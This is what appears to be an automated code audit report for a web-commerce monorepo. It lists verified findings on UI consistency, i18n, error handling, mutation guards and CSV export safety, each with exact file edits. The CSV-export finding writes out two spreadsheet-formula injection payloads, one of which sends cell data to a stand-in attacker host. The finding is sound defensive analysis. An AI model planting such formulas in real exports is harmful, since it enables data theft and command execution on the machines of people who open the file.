# Operis consistency & correctness audit — 2026-09-09
15 audit lanes, adversarially verified. 43 findings confirmed, 1 refuted.
17 verifiers could not run (session limit); their findings are excluded entirely.

## [HIGH] broken-flow — Customer-facing quote page drops every adjustment line from the totals it shows
**Lane:** authoring-chain  **Fix is safe:** True
**Divergent sites:**
- packages/core/src/modules/sales/frontend/quote/[token]/page.tsx:190
- packages/core/src/modules/sales/frontend/quote/[token]/page.tsx:14
**Canonical:** packages/core/src/modules/sales/backend/sales/documents/[id]/page.tsx:2872
**Why it matters:** `calculations.ts:196-228` folds shipping, surcharge and custom-kind adjustments into `subtotalGross`, and `grandTotalGross = round(subtotalGross)`. A quote carrying a 15.00 "Rush handling" surcharge therefore shows the customer a Total that is 15.00 higher than the line items with no row anywhere explaining it — the merchant sees "Rush handling 15.00" on the admin page, the customer sees an unexplained number. Because Subtotal (gross) and Total are the same value by construction, the intervening Discount and Tax rows also read as arithmetic that does not hold. This is the artefact the customer clicks Accept on, which converts straight into a binding order (`api/quotes/accept/route.ts`).
**Proposed fix:** Add `adjustments: Array<{ label: string | null; kind: string | null; rate: string | null; amountGross: string | null; amountNet: string | null }>` to `PublicQuoteResponse` in packages/core/src/modules/sales/frontend/quote/[token]/page.tsx:14, and in the totals section render one row per adjustment between the tax row and the total row, using the same label rule as the admin page (`label` else the `sales.documents.adjustments.kindLabels.<kind>` translation, with the `(rate%)` suffix) and `amountGross ?? amountNet`. No API or persistence change is needed — the data is already on the wire.
**Note:** No spec in .ai/specs/ covers the public quote page; SPEC-047 only governs the admin document detail page and explicitly keeps adjustments as an independent CRUD section there. `unitPriceReference.enabled` is likewise returned but ignored by this page — harmless, since `buildUnitPriceReferenceSnapshot` (sales/commands/documents.ts:2499) only ever emits `enabled: true`.
**Verifier:** Verified every claim by opening the files. (1) `packages/core/src/modules/sales/frontend/quote/[token]/page.tsx:14-47` declares `PublicQuoteResponse` with exactly `quote`, `lines`, `isExpired` — no `adjustments` field; the totals section (lines 193-219) renders exactly four hardcoded rows (subtotalGross, discountTotal, taxTotal, grandTotalGross). (2) The API genuinely ships the data: `api/quotes/public/[token]/route.ts` loads `SalesQuoteAdjustment` (lines 61-66) and returns `adjustments: adjustments.map(...)` at lines 122-132, and the OpenAPI response schema documents the array at lines 202-214. (3) The math claim is exact: `lib/calculations.ts` folds order-scoped adjustments into `subtotalGross` — tax `+= gross` (195), shipping `+= gross` (201), surcharge `+= gross || net` (209), custom kinds `+= gross` (226) — and line 248 computes `const grandTotalGross = round(subtotalGross)`, with `subtotalGrossAmount` set from the same accumulator at 261. The quoted `#4052` invariant comment is verbatim at 218-224. So a 15.00 surcharge lands in the customer's Total with no row anywhere on the page explaining it, and the line items (which the page prints per-line as `totalGrossAmount`) sum 15.
**Fix notes:** EXACT EDITS (single file, display-only):
1. `packages/core/src/modules/sales/frontend/quote/[token]/page.tsx:26` — after `grandTotalGrossAmount: string` closes the `quote` object at line 27, add a sibling to `lines`/`isExpired`: `adjustments: Array<{ scope: string | null; kind: string | null; label: string | null; rate: string | null; amountNet: string | null; amountGross: string | null }>`. Match the route's shape (route.ts:122-132) — note the route also returns `currencyCode`, `position` and `quoteLineId`; include only what you render. Make the field optional (`adjustments?:`) or guard with `data.quote` style null-checks, because `apiCallOrThrow` does not validate the payload and an older cached response would otherwise crash `.map`.
2. `page.tsx:207-212` — after the tax row and before the total row (213), render `{(data.adjustments ?? []).map(...)}`, one flex row per adjustment styled

## [HIGH] consistency — 7 of 9 workflow node components paint their React Flow handles with a hardcoded hex `#0080FE` and `border-white`, while the other 2 in the same folder use DS tokens
**Lane:** ds-tokens  **Fix is safe:** False
**Divergent sites:**
- packages/core/src/modules/workflows/components/nodes/StartNode.tsx:51
- packages/core/src/modules/workflows/components/nodes/EndNode.tsx:44
- packages/core/src/modules/workflows/components/nodes/AutomatedNode.tsx:61
- packages/core/src/modules/workflows/components/nodes/AutomatedNode.tsx:78
- packages/core/src/modules/workflows/components/nodes/UserTaskNode.tsx:47
- packages/core/src/modules/workflows/components/nodes/UserTaskNode.tsx:64
- packages/core/src/modules/workflows/components/nodes/SubWorkflowNode.tsx:55
- packages/core/src/modules/workflows/components/nodes/SubWorkflowNode.tsx:72
- packages/core/src/modules/workflows/components/nodes/WaitForTimerNode.tsx:51
- packages/core/src/modules/workflows/components/nodes/WaitForTimerNode.tsx:67
- packages/core/src/modules/workflows/components/nodes/WaitForSignalNode.tsx:49
- packages/core/src/modules/workflows/components/nodes/WaitForSignalNode.tsx:66
- packages/core/src/modules/workflows/components/WorkflowNodeCard.tsx:42
**Canonical:** packages/core/src/modules/workflows/components/nodes/ParallelForkNode.tsx:47
**Why it matters:** `#0080FE` and `border-white` are literal values that do not flip with the theme. In dark mode every connection handle on the workflow canvas keeps a hard white ring against a dark canvas, and the selected-node ring keeps a light-mode blue — while the two Parallel nodes sitting on the same canvas correctly render `bg-primary` / `border-background`. The result is visibly inconsistent handles within a single diagram. AGENTS.md: "NEVER hardcode a colour: no hex/rgb in className."
**Proposed fix:** Replace `!bg-[#0080FE] !border-2 !border-white` with `!bg-primary !border-2 !border-background` in the 7 node files (12 sites), copying ParallelForkNode.tsx:47 verbatim. For WorkflowNodeCard.tsx:42 use `border-primary` plus the DS focus/selection ring (`ring-2 ring-ring` or `shadow-focus`) instead of the arbitrary `shadow-[0_0_0_3px_rgba(...)]`.
**Note:** Unenforced by lint: `om-ds/no-hardcoded-status-colors` only runs on `packages/core/src/modules/**/backend/**` (eslint.ds.config.mjs), and `components/` is outside that glob except for the tasks/chat/invoice overrides. The rule's GENERIC_PATTERN also matches only Tailwind ramps, never hex literals — so no lint pass will ever flag this. No .ai/specs/ entry mentions `0080FE`.
**Verifier:** Verified every claim by opening the files; all 13 cited file:line locations exist verbatim with zero line drift.

CONFIRMED:
- The 12 handle sites all read exactly `className="!w-3 !h-3 !bg-[#0080FE] !border-2 !border-white"`, and WorkflowNodeCard.tsx:42 reads exactly `? 'shadow-[0_0_0_3px_rgba(0,128,254,0.15)] border-[#0080FE]'`.
- Canonical confirmed: ParallelForkNode.tsx:47 and :63, plus ParallelJoinNode.tsx:47 and :63, all read `className="!w-3 !h-3 !bg-primary !border-2 !border-background"` — same directory, same React Flow `<Handle>` element, same props.
- `git status --porcelain packages/core/src/modules/workflows/` is empty: not already fixed.
- Not test/generated/dist/node_modules — these are production components under `components/nodes/`.
- A full-repo grep for `0080fe` and `0, *128, *254` (excluding node_modules/.git/.mercato/dist/.next) returns ONLY these 13 source lines. There is no such token, no workflows-scoped .css file, and no `.ai/specs/` entry.
- `packages/core/src/modules/workflows/AGENTS.md` documents no deliberate colour exception (its only "handler"/"token" hits are engine DI tokens, unrelated).
- The lint-scope note is accurate. `eslint.ds.config.mjs:68-71
**Fix notes:** The HANDLE half of the proposed fix is safe. The WorkflowNodeCard half, AS PROPOSED, is a functional regression — this is why fixIsSafe is false.

SAFE — the 12 handle sites. Replace verbatim:
  `!w-3 !h-3 !bg-[#0080FE] !border-2 !border-white`
  -> `!w-3 !h-3 !bg-primary !border-2 !border-background`
This copies ParallelForkNode.tsx:47 exactly. `--primary` and `--background` are both real, theme-flipping tokens defined at globals.css:332/320 (light) and :535/:523 (dark), and neither is neutered anywhere. Note this DOES change the rendered colour from bright blue to navy — but that is the point of the fix, and it makes the seven node types match the two Parallel ones that already render navy.

UNSAFE AS WRITTEN — WorkflowNodeCard.tsx:42. The finding proposes `ring-2 ring-ring` or `shadow-focus`. BOTH RENDER FULLY TRANSPARENT. globals.css:1212-1233 contains an unconditional, deliberate "F

## [HIGH] consistency — feature_toggles skeleton placeholders add `dark:bg-foreground` on top of `bg-surface-muted`, turning them into near-white slabs in dark mode
**Lane:** ds-tokens  **Fix is safe:** True
**Divergent sites:**
- packages/core/src/modules/feature_toggles/components/FeatureToggleOverrideCard.tsx:107
- packages/core/src/modules/feature_toggles/components/FeatureToggleOverrideCard.tsx:115
- packages/core/src/modules/feature_toggles/components/FeatureToggleOverrideCard.tsx:116
**Canonical:** packages/ui/src/primitives/skeleton.tsx:23
**Why it matters:** `foreground` is the ink token, not a surface — in dark mode it resolves to the light text colour. The `dark:` override therefore repaints each loading placeholder as a bright near-white block on the dark card, instead of the quiet `surface-muted` fill every other skeleton in the app uses. It is also a direct violation of the DS rule "All semantic tokens have dedicated dark mode values — NO `dark:` overrides needed" (.ai/ds-rules.md).
**Proposed fix:** Delete the three `dark:bg-foreground` classes; `bg-surface-muted` alone is correct in both themes. Better still, replace the three hand-rolled divs with `<Skeleton />` from `@open-mercato/ui/primitives/skeleton`, which is the canonical placeholder.
**Note:** No lint rule covers `dark:` overrides on semantic tokens — `om-ds/no-hardcoded-status-colors` strips the `dark:` prefix and then only matches Tailwind colour ramps, so `dark:bg-foreground` passes clean. Also outside the rule's backend-only glob.
**Verifier:** Confirmed by opening every cited file. (1) Cited lines exist verbatim at the exact line numbers claimed — no drift: FeatureToggleOverrideCard.tsx:107 `<CardDescription className="h-5 w-48 animate-pulse bg-surface-muted dark:bg-foreground rounded-md" />`, :115 `<div className="h-9 w-full animate-pulse rounded-md bg-surface-muted dark:bg-foreground" />`, :116 same with `h-20`. (2) Canonical confirmed — packages/ui/src/primitives/skeleton.tsx:23 is exactly `const baseLine = 'animate-pulse rounded-md bg-surface-muted'`, no dark override. (3) The consequence is real and I verified it against the token source, apps/mercato/src/app/globals.css: light `:root` has `--foreground: #1D2735` / `--surface-muted: #EDF1F7`; the `.dark` block (line 501+) has `--background: #10151E`, `--surface: #171E2A`, `--surface-muted: #1E2735`, `--foreground: #E6ECF4`. So in dark mode the override repaints the placeholder from #1E2735 (a correct subtle lift over the #171E2A card) to #E6ECF4, a near-white pulsing slab at maximal contrast on a dark card. Not cosmetic taste — a visibly broken loading state. (4) The DS rule is quoted accurately: .ai/ds-rules.md:468 reads "NEVER add `dark:` overrides on semantic tok
**Fix notes:** Minimal fix — delete the three `dark:bg-foreground` classes, leaving `bg-surface-muted`, which is already correct in both themes:

- Line 107: `bg-surface-muted dark:bg-foreground rounded-md` -> `bg-surface-muted rounded-md`
- Line 115: `rounded-md bg-surface-muted dark:bg-foreground` -> `rounded-md bg-surface-muted`
- Line 116: `rounded-md bg-surface-muted dark:bg-foreground` -> `rounded-md bg-surface-muted`

Safety: purely presentational. No behavior change, no DB migration, no frozen persisted identifier (no ACL feature id, event id, notification type, or schema), no public contract. Light mode is byte-identical before and after, since the `dark:` variant never applied there; only the broken dark rendering changes, which is the defect itself.

Optional follow-up (the reporter's "better still", and the DS-preferred form): replace the two hand-rolled divs at 115-116 with the canonical p

## [HIGH] security — Three hand-rolled WMS CSV exporters skip the shared serializer's spreadsheet-formula neutralization
**Lane:** dup-logic  **Fix is safe:** True
**Divergent sites:**
- packages/core/src/modules/wms/components/backend/WmsLotDetailPage.tsx:145
- packages/core/src/modules/wms/components/backend/WmsLotDetailPage.tsx:151
- packages/core/src/modules/wms/components/backend/WmsSkuDetailPage.tsx:119
- packages/core/src/modules/wms/components/backend/WmsSkuDetailPage.tsx:125
- packages/core/src/modules/wms/components/backend/WmsLocationDetailPage.tsx:133
- packages/core/src/modules/wms/components/backend/WmsLocationDetailPage.tsx:139
**Canonical:** packages/shared/src/lib/crud/exporters.ts:83
**Why it matters:** A warehouse name, location code or lot number saved as `=HYPERLINK("http://attacker/"&A1,"ok")` or `@SUM(1+9)*cmd|'/c calc'!A1` is written verbatim into the downloaded CSV. Opening that file in Excel/LibreOffice/Sheets executes the formula (CSV injection) — exfiltrating adjacent cells or prompting a shell launch. Every other CSV export in the repo is already protected because it goes through serializeExport; only these three WMS pages bypass it. The dropped \r also lets a value containing a bare carriage return break row alignment for the rest of the file.
**Proposed fix:** Delete escapeCsvCell/downloadCsvFile from all three files and route the exports through the shared serializer: build a PreparedExport ({ columns, rows }) and call serializeExport(prepared, 'csv') from @open-mercato/shared/lib/crud/exporters, then reuse the same Blob/anchor download. If the string[][] shape must stay, add one exported helper next to serializeCsv (e.g. serializeCsvMatrix(rows)) that runs neutralizeSpreadsheetFormula + escapeCsv per cell, and have the three pages import it.
**Note:** packages/shared/src/lib/crud/exporters.ts is already a dependency of packages/ui/src/backend/DataTable.tsx, so no new package edge is introduced. Nothing in .ai/specs/ schedules this.
**Verifier:** Confirmed by opening every cited file. Canonical packages/shared/src/lib/crud/exporters.ts contains escapeCsv (L34-38, regex /[",\n\r]/), neutralizeSpreadsheetFormula (L41-46, /^[=+\-@\t\r\n]/) and normalizeCsvValue (L48-55) exactly as quoted, applied in serializeCsv L83-92. All three WMS pages contain the byte-identical hand-rolled pair at exactly the cited lines (Lot L145/L151, Sku L119/L125, Location L133/L139) with regex /[",\n]/ and no formula neutralization. Not a style issue and not guarded upstream: packages/core/src/modules/wms/data/validators.ts constrains warehouse code/name (L47-48, L68-69), location code (L78) and lotNumber (L131) only with z.string().trim().min(1).max(N) — no charset restriction — and the label formatters place that operator string at the head of the cell with no fixed prefix (WmsLotDetailPage.tsx:178-182 formatLocationLabel returns the trimmed code; WmsLocationDetailPage.tsx:166-189 formatSkuLabel/formatVariantName/formatLotLabel likewise). The canonical is genuinely dominant: serializeExport backs packages/ui/src/backend/DataTable.tsx:917 (every DataTable export), packages/shared/src/lib/crud/factory.ts:1907 and :2109 (every CRUD export), plus audit
**Fix notes:** No DB migration, no frozen persisted identifier (no ACL feature, event id, notification type or schema touched), and no public contract change — both helpers are non-exported and file-local. The only intended output change is the leading apostrophe on cells starting with = + - @ tab/CR/LF, which is the defect fix itself.

CRITICAL TRAP the implementer must avoid — verified against the canonical's own test at packages/shared/src/lib/crud/__tests__/exporters.test.ts: normalizeCsvValue (exporters.ts:48-55) exempts a value only when `typeof value === 'number' | 'bigint' | 'boolean'`. The test asserts `balance: -42` (number) exports as `-42` while `balance: '-7'` (string) exports as `'-7`. All three WMS handlers currently pre-stringify their quantity columns — `String(toNumber(row.quantity_on_hand))` and `String(toNumber(row.quantity_reserved))` (WmsLotDetailPage.tsx:828-829, WmsSkuDetailPage

## [HIGH] broken-flow — business_rules create pages parse the error body with raw `response.json()`, so a non-JSON error response replaces the real failure with a JSON SyntaxError
**Lane:** forms-validation  **Fix is safe:** True
**Divergent sites:**
- packages/core/src/modules/business_rules/backend/rules/create/page.tsx:53
- packages/core/src/modules/business_rules/backend/sets/create/page.tsx:43
**Canonical:** packages/core/src/modules/business_rules/backend/rules/[id]/page.tsx:89
**Why it matters:** `Response.json()` rejects with a SyntaxError on an empty or non-JSON body. Any error response that is not JSON — an empty 500, a proxy/gateway 502 HTML page, a 413 from the platform — makes the `await response.json()` throw before the fallback `t('business_rules.errors.createFailed')` can ever be used. CrudForm's catch (packages/ui/src/backend/CrudForm.tsx:3109) then renders that SyntaxError, so the admin sees "Unexpected end of JSON input" instead of a real message, and the actual HTTP status is lost. Throwing a bare `Error` also drops `status`, so nothing downstream can distinguish a 409/413/502 from a validation 400.
**Proposed fix:** In both create pages, mirror the sibling edit pages verbatim: import `readJsonSafe` from `@open-mercato/ui/backend/utils/serverErrors` and `CrudHttpError` from `@open-mercato/shared/lib/crud/errors`, then replace the two lines with `const body = (await readJsonSafe<Record<string, unknown>>(response)) ?? {}` / message resolution / `throw new CrudHttpError(response.status, { ...body, error: message })`.
**Note:** No spec in .ai/specs/ schedules this; SPEC-025-2026-02-12-ai-assisted-business-rules.md touches formConfig.tsx only for AI-suggestion CSS. Note that these routes hand-roll their error body as `{ error: 'Validation failed: <path>: <msg>' }` (api/rules/route.ts:253-254, api/sets/route.ts:171) rather than the `{ error, fieldErrors }` shape the CrudForm field-error channel consumes — that is a separate, larger divergence from `makeCrudRoute` and is out of scope for a small local edit.
**Verifier:** I opened all four files and every quoted line is present at the exact cited line number — no drift. rules/create/page.tsx:52-54 and sets/create/page.tsx:42-44 both contain `if (!response.ok) { const error = await response.json(); throw new Error(...) }` verbatim. The canonical sibling edit pages contain `readJsonSafe` at rules/[id]/page.tsx:89 and sets/[id]/page.tsx:104, with `throw new CrudHttpError(response.status, { ...body, error: message })` at :94 and :109, and the imports at rules/[id]:14-15 and sets/[id]:16-17.

Adversarial checks that could have refuted it, all of which failed to:
1. DEAD-CODE CHECK: I read `apiFetch` (packages/ui/src/backend/utils/api.ts:180-260). It throws/redirects ONLY on 401 and 403; every other status returns the Response unchanged. So the `!response.ok` branch is live for 400/409/413/500/502 — not dead code.
2. DOMINANCE CHECK: 17 .tsx files use `readJsonSafe`. The only .tsx sites parsing an error body with raw `response.json()` inside a `!response.ok` branch are exactly these two backend pages plus workflows/frontend/checkout-demo/page.tsx:704. The other raw `response.json()` hits (packages/search/.../SearchSettingsPageClient.tsx, FulltextSearchSec
**Fix notes:** EXACT EDITS (two files, mirroring the siblings verbatim).

1) packages/core/src/modules/business_rules/backend/rules/create/page.tsx
Add to the import block (matching rules/[id]/page.tsx:14-15):
  import { readJsonSafe } from '@open-mercato/ui/backend/utils/serverErrors'
  import { CrudHttpError } from '@open-mercato/shared/lib/crud/errors'
Replace lines 53-54 so the block reads:
    if (!response.ok) {
      const body = (await readJsonSafe<Record<string, unknown>>(response)) ?? {}
      const message =
        (typeof body.error === 'string' && body.error) ||
        (typeof body.message === 'string' && body.message) ||
        t('business_rules.errors.createFailed')
      throw new CrudHttpError(response.status, { ...body, error: message })
    }

2) packages/core/src/modules/business_rules/backend/sets/create/page.tsx
Same two imports (matching sets/[id]/page.tsx:16-17); replace line

## [HIGH] consistency — Tenant create page hardcodes six English labels that already exist as directory.tenants.* keys used by the sibling edit page
**Lane:** i18n  **Fix is safe:** True
**Divergent sites:**
- packages/core/src/modules/directory/backend/directory/tenants/create/page.tsx:9
- packages/core/src/modules/directory/backend/directory/tenants/create/page.tsx:10
- packages/core/src/modules/directory/backend/directory/tenants/create/page.tsx:14
- packages/core/src/modules/directory/backend/directory/tenants/create/page.tsx:15
- packages/core/src/modules/directory/backend/directory/tenants/create/page.tsx:26
- packages/core/src/modules/directory/backend/directory/tenants/create/page.tsx:32
**Canonical:** packages/core/src/modules/directory/backend/directory/tenants/[id]/edit/page.tsx:33
**Why it matters:** A superadmin on a pl/de/es/ko/vi/fr/zh locale sees the Edit Tenant form fully localized and the Create Tenant form entirely in English — same entity, adjacent screens. The translations for four of the six strings already exist and are simply not wired up; `yarn i18n:check-sync` passes because the keys are present, so nothing catches it.
**Proposed fix:** Add `const t = useT()` to the create page, move `fields`/`groups` into `React.useMemo(..., [t])` exactly as the edit page does, and reuse the existing keys for Name/Active/Details/Custom Data. Add two new keys `directory.tenants.form.title.create` and reuse `directory.tenants.list.actions.create` ("Create", en.json:130) for the submit label.
**Note:** Not covered by .ai/specs/2026-05-26-missing-translations-audit-and-remediation.md — its phases target api_docs (Ph2), content (Ph3), packages/ui primitives (Ph4) and throw/error messages (Ph5). Hardcoded JSX attributes in a module that already has i18n are outside every phase.
**Verifier:** Confirmed by reading both files in full. packages/core/src/modules/directory/backend/directory/tenants/create/page.tsx has no `useT` import and hardcodes all six strings at exactly the cited lines (9, 10, 14, 15, 26, 32). The sibling edit page at packages/core/src/modules/directory/backend/directory/tenants/[id]/edit/page.tsx translates the identical strings at exactly the cited lines (31, 33, 34, 37, 38, 134, 144). The keys exist at packages/core/src/modules/directory/i18n/en.json:124-127 and :130 as claimed.

Dominance verified, not assumed: 44 of 47 `*/create/page.tsx` files under packages/core/src/modules import `useT`. The two other non-useT pages (customers/backend/customers/deals/create/page.tsx, sales/backend/sales/channels/[channelId]/offers/create/page.tsx) delegate their whole form to child components (CreateDealForm, ChannelOfferForm) that both use `useT`. So the tenants create page is the ONLY create page in core that defines CrudForm fields inline and hardcodes their labels.

An even closer canonical the reporter missed: packages/core/src/modules/directory/backend/directory/organizations/create/page.tsx — same module, same CrudForm shape, translates every field label 
**Fix notes:** Exact edits, all in packages/core/src/modules/directory/backend/directory/tenants/create/page.tsx:

1. Add imports: `import * as React from 'react'` and `import { useT } from '@open-mercato/shared/lib/i18n/context'`.
2. Delete the module-scope `fields` (L8-11) and `groups` (L13-16) consts; rebuild them inside CreateTenantPage as `React.useMemo<CrudField[]>(() => [...], [t])` / `React.useMemo<CrudFormGroup[]>(() => [...], [t])`, mirroring the edit page L32-39.
3. Reuse EXISTING keys (no new JSON needed for five of the seven strings):
   - L9 label  -> t('directory.tenants.form.fields.name', 'Name')
   - L10 label -> t('directory.tenants.form.fields.active', 'Active')
   - L14 title -> t('directory.tenants.form.groups.details', 'Details')
   - L15 title -> t('directory.tenants.form.groups.custom', 'Custom Data')
   - L26 title -> t('directory.nav.tenants.create', 'Create Tenant')  <-- use 

## [HIGH] consistency — Tenant flash messages are hardcoded, URL-encoded English in redirect URLs while every sibling module wraps them in encodeURIComponent(t(...))
**Lane:** i18n  **Fix is safe:** True
**Divergent sites:**
- packages/core/src/modules/directory/backend/directory/tenants/create/page.tsx:34
- packages/core/src/modules/directory/backend/directory/tenants/[id]/edit/page.tsx:146
- packages/core/src/modules/directory/backend/directory/tenants/[id]/edit/page.tsx:176
**Canonical:** packages/core/src/modules/directory/backend/directory/organizations/[id]/edit/page.tsx:340
**Why it matters:** After creating, saving or deleting a tenant, a non-English admin gets an English toast ("Tenant created") in an otherwise localized UI. Because the copy is baked into a query string rather than passed through t(), it is invisible to i18n tooling and to translators.
**Proposed fix:** Mirror the organizations pages: add `directory.tenants.flash.created`/`.updated` keys (reuse the existing `directory.tenants.list.success.delete` for the delete redirect) and build the three redirects as template literals with `encodeURIComponent(t(...))`. The edit page already has `const t = useT()` at line 31.
**Note:** Also outside the phases of .ai/specs/2026-05-26-missing-translations-audit-and-remediation.md, and invisible to `yarn i18n:check-hardcoded` because the literal lives inside a URL string, not a flagged JSX prop.
**Verifier:** Every claim checks out against the files I opened; each refutation avenue failed.

(1) Cited lines exact, no drift. `tenants/create/page.tsx:34` = `successRedirect="/backend/directory/tenants?flash=Tenant%20created&type=success"`; `tenants/[id]/edit/page.tsx:146` (updated) and `:176` (deleteRedirect) match verbatim. Canonical sites also exact: `organizations/[id]/edit/page.tsx:340` and `:362`, `organizations/create/page.tsx:185`.

(2) Not excluded code. These are live source `.tsx` pages, dynamically imported by `apps/mercato/.mercato/generated/backend-route-shard.018.directory.generated.ts:11` and `:14`, feature-gated behind `directory.tenants.manage`. The `packages/core/dist/**` hits for the same strings are compiled output of this source, not an independent site.

(3) Canonical IS dominant. Full repo census of `flash=` redirects (excluding node_modules/__tests__/generated): 22 sites use `encodeURIComponent(t(...))`, exactly 3 use a baked-in URL-encoded literal — and all 3 are the cited tenants sites. Spans checkout, auth (roles/users), catalog, customer_accounts, entities, directory/organizations, and the example module.

(4) No documented exception. There is no `packages/core/s
**Fix notes:** CORRECTION to the reporter's fix advice: it says "The edit page already has `const t = useT()` at line 31" — true for the EDIT page only. The CREATE page has no `useT` import and no `t` binding at all; it is entirely un-i18n'd (literal `title="Create Tenant"`, `label: 'Name'`, `label: 'Active'`, `title: 'Details'`, `title: 'Custom Data'`, `submitLabel="Create"`). The create-page fix therefore requires adding the import and hook, not just wrapping a string.

Exact edits:

1. `tenants/create/page.tsx` — add `import { useT } from '@open-mercato/shared/lib/i18n/context'`, add `const t = useT()` inside `CreateTenantPage`, and replace line 34 with:
   successRedirect={`/backend/directory/tenants?flash=${encodeURIComponent(t('directory.tenants.flash.created', 'Tenant created'))}&type=success`}
   Note the module-level `const fields`/`const groups` arrays would need to move inside the component 

## [HIGH] security — WMS warehouse-assignment DELETE still uses the @deprecated guard pair that bypasses the mutation-guard registry, while PUT/PATCH/POST in the same file use the canonical registry path
**Lane:** open-loops  **Fix is safe:** True
**Divergent sites:**
- packages/core/src/modules/wms/api/sales-orders/[salesOrderId]/warehouse-assignment/route.ts:187
- packages/core/src/modules/wms/api/sales-orders/[salesOrderId]/warehouse-assignment/route.ts:213
- packages/core/src/modules/wms/api/sales-orders/[salesOrderId]/warehouse-assignment/route.ts:14
**Canonical:** packages/core/src/modules/wms/api/inventory/helpers.ts:61
**Why it matters:** Both directions of the same operation are reachable from one UI control (packages/core/src/modules/wms/widgets/injection/sales-order-stock-context/widget.client.tsx:160 sends PUT, :170 sends DELETE on the same `warehouse-assignment` path). Assigning a warehouse runs the full mutation-guard registry — record locks, feature-gated guards, any module-registered guard. Removing the assignment runs only the single DI-registered legacy service, which in a default container is absent, so `validateCrudMutationGuard` returns `null` and the route proceeds with no guard at all. A record lock or approval guard that blocks reassignment does not block unassignment, and the guards' `afterSuccess` callbacks (audit/undo bookkeeping) never fire for the delete. AGENTS.md lists "Never bypass mutation guards" as a hard Never rule.
**Proposed fix:** Route DELETE through the same registry wrapper the rest of the file already uses: replace the `validateCrudMutationGuard` call at :187 with `runRouteMutationGuards({ container: ctx.container, req: request, auth: { userId: ctx.auth?.sub ?? '', tenantId: scope.tenantId, organizationId: scope.organizationId }, input: { resourceKind: 'wms.sales_order_warehouse_assignment', resourceId: parsedParams.salesOrderId, operation: 'delete', mutationPayload: { salesOrderId: parsedParams.salesOrderId } } })`, return `guardResult.response` when `!guardResult.ok`, and swap the `runCrudMutationGuardAfterSuccess` call at :213 for `await guardResult.runAfterSuccess()`. Drop the now-unused import at :12-15.
**Note:** No spec schedules this migration; the closest, .ai/specs/2026-07-03-warranty-rma-claims-desk.md:458, records `runRouteMutationGuards` as the compliant pattern for hand-written writes. `validateCrudMutationGuard` is still used in ~90 files repo-wide, so this is deliberately scoped to the one site where the *same file* already uses the canonical path — not a repo-wide campaign. A second WMS site, packages/core/src/modules/wms/api/inventory/import/helpers.ts:145, has the identical problem and is worth fixing in the same edit.
**Verifier:** SURVIVES, with one substantive correction to the stated mechanism.

CONFIRMED VERBATIM (no line drift): route.ts:12-15 imports `runCrudMutationGuardAfterSuccess, validateCrudMutationGuard`; :187 calls `validateCrudMutationGuard(ctx.container, {... operation: 'custom', requestMethod: request.method ...})`; :213 calls `runCrudMutationGuardAfterSuccess`. PUT (:159-165) and PATCH (:167-173) both delegate to `executeAssignMutation` → `executeWmsCustomPostRoute` (:135), whose canonical `runRouteMutationGuards` call sits at helpers.ts:61 under the exact comment quoted (helpers.ts:56-60). The `@deprecated` JSDoc at packages/shared/src/lib/crud/mutation-guard.ts:47-56 reads exactly as quoted. Widget PUT is at widget.client.tsx:162, DELETE at :172, both inside one `persistAssignment` callback (:146). Not a test/generated/dist file. Not fixed in the working tree (tree clean at ffd7404f).

CORRECTION — the `why` mechanism is factually WRONG. It claims "in a default container [the legacy service] is absent, so `validateCrudMutationGuard` returns null and the route proceeds with no guard at all." `crudMutationGuardService` IS registered platform-wide in every request container — packages/shared/
**Fix notes:** No migration, no frozen persisted identifier, no public contract change. The route can now be blocked by a registry guard where it previously could not — that is the fix itself — and today nothing would actually block it (no lock reader for `wms.sales_order_warehouse_assignment`), so observable behaviour is unchanged in this fork. The only added work per request is one `rbacService.getGrantedFeatures` call, and `resolveGrantedFeatures` (packages/shared/src/lib/auth/grantedFeatures.ts) is fail-safe — returns `[]` when RBAC is unavailable rather than throwing.

EDIT 1 — route.ts:12-15, replace the import block:
  import { runRouteMutationGuards } from '@open-mercato/shared/lib/crud/route-mutation-guard'
(both `validateCrudMutationGuard` and `runCrudMutationGuardAfterSuccess` become unused; `runCustomRouteAfterInterceptors` at :16 stays.)

EDIT 2 — route.ts:187-200, replace the call and its

## [HIGH] consistency — WMS lots list page renders the same title three times (PageHeader + hand-rolled h2 + DataTable title)
**Lane:** page-layout  **Fix is safe:** False
**Divergent sites:**
- packages/core/src/modules/wms/components/backend/WmsLotsListPage.tsx:239
- packages/core/src/modules/wms/components/backend/WmsLotsListPage.tsx:250
- packages/core/src/modules/wms/components/backend/WmsLotsListPage.tsx:256
- packages/core/src/modules/wms/components/backend/WmsLotsListPage.tsx:262
**Canonical:** packages/core/src/modules/customers/backend/customers/people/page.tsx:897
**Why it matters:** The user sees "Lots" (and its description) stacked three times on one screen at three different type sizes, and the hand-rolled `<section>` re-implements the card chrome that a non-embedded DataTable already provides. It also mints a duplicate heading hierarchy for screen readers (h1 then h2 then h2, all identical text).
**Proposed fix:** Delete the PageHeader at line 239 and the hand-rolled title/description block at lines 251-259, drop `embedded` from the DataTable, and let `<DataTable title={title} .../>` own the page header and card — matching customers/people/page.tsx. If the Layers icon is wanted, pass it inside the DataTable `title` node.
**Note:** wms has no module AGENTS.md and .ai/specs/2026-08-23-pca-design-language-migration.md (all phases marked done, Phase 4 established "page header above the card") does not list this page as a deliberate exception.
**Verifier:** I opened every cited file and the finding holds exactly as written, at the exact line numbers claimed.

CONFIRMED, line by line (WmsLotsListPage.tsx):
- :218-234 build a single `title` and a single `description` from `expiryWindow`.
- :239 `<PageHeader title={title} description={description} />` → Page.tsx:110 renders `<h1 className="text-2xl font-normal leading-tight text-foreground sm:text-3xl">`.
- :250 hand-rolled `<section className="rounded-xl border border-border bg-surface shadow-sm p-5 text-card-foreground shadow-sm">` (note the duplicated `shadow-sm`).
- :256 `<h2 className="text-xl font-semibold">{title}</h2>` and :257 `<p className="text-sm text-muted-foreground">{description}</p>` — the SAME two variables again.
- :261 `embedded` :262 `title={title}` → DataTable.tsx:3521-3526 renders, for the embedded branch, `<h2 className="text-sm font-semibold leading-tight text-foreground">{title}</h2>`.
- DataTable.tsx:3392 `shouldRenderHeader = hasTitle || ...` — `title` is passed, so that third heading definitely renders; it is not suppressed by `embedded`.

So once `lotsQuery.data` resolves the page shows the identical string three times at 2xl/3xl, xl, and sm, and the descript
**Fix notes:** Not "unsafe" in the contract sense — no migration, no frozen persisted identifier, no public contract, no DB or API change. I set fixIsSafe=false strictly because the finding's proposed fix (drop `embedded`) alters presentation behaviour BEYOND the duplicate title. Dropping `embedded` flips four other things in DataTable.tsx:

- :3665 `density={embedded ? 'compact' : 'default'}` — rows get taller.
